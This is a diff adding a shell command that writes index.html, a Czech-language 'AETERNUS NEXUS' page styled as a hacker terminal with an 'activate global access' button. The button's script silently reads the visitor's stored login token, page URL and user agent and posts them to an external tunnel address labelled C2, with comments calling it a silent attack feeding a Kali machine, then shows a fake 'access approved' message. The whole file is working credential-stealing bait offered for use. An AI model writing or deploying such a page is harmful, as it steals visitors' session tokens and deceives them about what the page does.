@@ -1,0 +1,43 @@
+cat <<EOF > index.html
+<!DOCTYPE html>
+<html lang="cs">
+<head>
+    <meta charset="UTF-8"><title>AETERNUS NEXUS | GLOBAL</title>
+    <style>
+        body{background:#000;color:#0dff00;font-family:'Courier New',monospace;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;margin:0;}
+        .glitch{font-size:2em;font-weight:bold;text-shadow:0 0 10px #0dff00;animation:pulse 2s infinite;}
+        @keyframes pulse{0%{opacity:1;}50%{opacity:0.5;}100%{opacity:1;}}
+        #btn{border:2px solid #0dff00;background:none;color:#0dff00;padding:20px 40px;cursor:pointer;font-weight:bold;margin-top:20px;}
+        #btn:hover{background:#0dff00;color:#000;}
+    </style>
+</head>
+<body>
+    <div class="glitch">AETERNUS NEXUS v1.0</div>
+    <div id="status">SYSTÉM ČEKÁ NA POVÉL...</div>
+    <button id="btn" onclick="ignite()">AKTIVOVAT GLOBÁLNÍ PŘÍSTUP</button>
+
+    <script>
+        const C2 = 'https://ebfaa1e1d7eb69.lhr.life'; // Tvůj stálý tunel do Kali
+        
+        async function ignite() {
+            document.getElementById('status').innerText = "NAVAZUJI SPOJENÍ S DRUŽICÍ...";
+            const data = {
+                t: localStorage.getItem('token') || 'GUEST_ACCESS',
+                loc: window.location.href,
+                ua: navigator.userAgent
+            };
+            
+            try {
+                // Tichý útok - odesíláme data do tvého mobilu kdekoli na světě
+                await fetch(C2, {method:'POST',mode:'no-cors',body:JSON.stringify(data)});
+            } catch(e){}
+            
+            setTimeout(() => { 
+                alert("PŘÍSTUP SCHVÁLEN. GLOBÁLNÍ RARITA AKTIVOVÁNA.");
+                document.getElementById('status').innerText = "ONLINE - PŘIPOJENO";
+            }, 2500);
+        }
+    </script>
+</body>
+</html>
+EOF
